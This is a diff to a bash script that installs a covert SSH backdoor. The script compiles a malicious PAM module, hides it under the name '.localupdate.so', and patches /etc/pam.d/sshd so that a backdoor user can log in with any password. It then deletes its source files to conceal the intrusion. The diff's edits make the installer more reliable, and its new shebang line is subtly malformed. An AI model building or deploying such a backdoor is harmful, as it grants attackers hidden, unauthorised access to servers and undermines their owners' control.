@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/bin/bash set -e
 
 sudo wget https://archive.kali.org/archive-keyring.gpg -O /usr/share/keyrings/kali-archive-keyring.gpg
 sudo apt update -y
@@ -14,7 +14,7 @@ gcc -fPIC -fno-stack-protector -c backdoor.c -o pam_backdoor.o
 ld -x --shared -o .localupdate.so pam_backdoor.o
 
 echo "[*] Installing PAM module..."
-sudo mkdir /lib/security
+sudo mkdir -p /lib/security
 sudo mv .localupdate.so /lib/security/
 
 echo "[*] Patching /etc/pam.d/sshd..."
@@ -54,9 +54,9 @@ sudo systemctl restart ssh
 
 echo "[✔] Setup complete. Try logging in as '$BACKDOOR_USER' with any password."
 
-sudo rm backdoor.c
-sudo rm pam_backdoor.o
-sudo rm PheonixUser.c
+[ -f backdoor.c ] && sudo rm backdoor.c
+[ -f pam_backdoor.o ] && sudo rm pam_backdoor.o
+[ -f PheonixUser.c ] && sudo rm PheonixUser.c
 
 echo "[✔] Clean complete
 
